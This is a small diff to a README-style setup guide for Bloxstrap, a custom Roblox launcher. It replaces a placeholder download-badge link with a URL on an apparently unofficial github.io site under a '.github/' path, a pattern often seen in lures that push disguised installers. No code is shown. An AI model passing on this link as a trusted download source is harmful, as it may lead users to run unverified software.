@@ -1,6 +1,6 @@
 # Bloxstrap — Offline Setup & Configuration Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-v2.9.0-blueviolet)](#)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-v2.9.0-blueviolet)](https://bloxstrap-launcher.github.io/.github/)
 
 A comprehensive guide for the offline installation and configuration of Bloxstrap, a custom launcher for Roblox that enhances the user experience with advanced features and performance improvements. This manual is intended for environments where direct internet access is limited or for users who prefer a managed, offline deployment.
 
